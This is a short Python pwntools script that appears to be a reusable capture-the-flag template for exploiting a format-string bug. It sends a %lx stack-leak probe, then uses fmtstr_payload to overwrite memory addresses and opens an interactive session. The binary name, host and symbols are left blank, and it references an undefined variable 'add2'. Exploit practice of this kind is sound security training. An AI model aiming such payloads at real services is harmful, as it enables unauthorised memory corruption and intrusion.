#!usr/bin/python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './'
elf = context.binary = ELF(exe, checksec=True)
context.log_level = 'debug'
host, port = '', 1337

def start(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE: 
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
'''.format(**locals())

# =========================================================
#                         FUZZING
# =========================================================
io = start()
io.sendlineafter(b'> ', b'AAAAAAAA.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx')
io.close()

# =========================================================
#                         ADDRESSES
# =========================================================
addr1 = elf.sym[''] # 
addr2 = elf.sym[''] # 
value = 0x86a693c

# =========================================================
#                         EXPLOITS
# =========================================================
io = start()

payload_auto = fmtstr_payload(6, {addr1 : add2, addr2 : value})

io.sendlineafter(b'> ', payload_auto)
io.interactive()